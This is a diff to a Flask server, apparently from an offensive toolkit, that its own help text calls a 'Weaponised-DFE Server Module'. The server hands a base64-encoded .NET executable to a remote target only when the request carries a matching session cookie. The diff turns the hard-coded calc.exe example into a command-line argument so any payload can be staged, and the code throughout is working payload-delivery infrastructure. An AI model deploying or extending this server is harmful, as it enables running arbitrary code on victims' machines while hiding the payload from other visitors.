@@ -9,6 +9,8 @@ from Crypto.Util.Padding import pad, unpad
 from flask import *
 from base64 import b64encode, b64decode
 
+import argparse
+
 banner = """
 ██╗    ██╗███████╗ █████╗ ██████╗  ██████╗ ███╗   ██╗██╗███████╗███████╗██████╗     ██████╗ ███████╗███████╗
 ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██║██╔════╝██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔════╝
@@ -74,7 +76,7 @@ def home():
 	sessionID = request.cookies.get("sessionID") # Here sessionID with a capital D, is used to identify if the user is verified or not
 	if sessionID:
 		if sessionID == ENC_JS:
-			rce: str = open(dotnetAssembly, "rb").read()
+			rce: str = open(args.exe.name, 'rb').read()
 			b64_rce: str = b64encode(rce).decode()
 			return make_response(b64_rce)
 		else:
@@ -122,10 +124,17 @@ def message():
 		return resp
 
 if __name__ == '__main__':
-	host: str = "0.0.0.0"
-	port: int = 443
+	# host: str = "0.0.0.0"
+	# port: int = 443
 	ssl_context: tuple = ("auth/cert.pem", "auth/key.pem")
 
-	dotnetAssembly: str = "example_assemblies/calc.exe"
+	# dotnetAssembly: str = args.exe.name
 
-	app.run(host = host, port = port, ssl_context = ssl_context, debug = False)
+	parser = argparse.ArgumentParser(description="Weaponised-DFE Server Module.", usage="%(prog)s [options] <.NET executable>")
+	parser.add_argument("exe", help=".NET compiled windows executable that would be executed on the remote target.", type=argparse.FileType('rb'))
+	parser.add_argument("--host", help="Local binding address. (default: 0.0.0.0)", default="0.0.0.0", metavar="")
+	parser.add_argument("--port", help="Local binding port. (default: 443)", default=443, metavar="", type=int)
+
+	args = parser.parse_args()
+
+	app.run(host = args.host, port = args.port, ssl_context = ssl_context, debug = False)
